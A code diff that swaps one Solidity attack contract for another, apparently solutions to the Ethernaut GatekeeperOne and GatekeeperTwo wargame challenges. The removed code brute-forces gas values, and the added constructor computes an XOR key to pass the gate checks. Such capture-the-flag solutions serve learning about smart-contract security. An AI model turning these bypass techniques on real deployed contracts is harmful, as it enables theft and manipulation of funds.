@@ -1,26 +1,20 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-contract HackGateKeeperOne {
-    IGateKeeperOne gateKeeperOne;
-    bytes8 key;
+contract HackGateKeeperTwo {
 
-    constructor(address _gateKeeperOne) {
-        gateKeeperOne = IGateKeeperOne(_gateKeeperOne);
+    constructor(address _gateKeeperTwo) {
+        IGateKeeperTwo gateKeeperTwo;
+        gateKeeperTwo = IGateKeeperTwo(_gateKeeperTwo);
+
+        bytes8 part1 = bytes8(keccak256(abi.encodePacked(address(this))));
+        bytes8 part2 = bytes8(type(uint64).max);
+        bytes8 key = part1 ^ part2;
+        gateKeeperTwo.enter(key);
     }
 
-    function hack() public{
-        key = bytes8(uint64(uint160(tx.origin))) & 0xffffffff0000ffff;
-        for(uint i=0; i<8191; i++) {
-            (bool success, ) = address(gateKeeperOne).call{gas:1000000+i}(abi.encodeWithSignature("enter(bytes8)", key));
-            //gateKeeperOne.enter{gas:1000000+i}(key); // Can't do abi call, reverts entire transaction when fails.
-            if (success) {
-                break;
-            }
-        }
-    }
 }
 
-interface IGateKeeperOne {
+interface IGateKeeperTwo {
   function enter(bytes8 _gateKey) external returns (bool);
 }
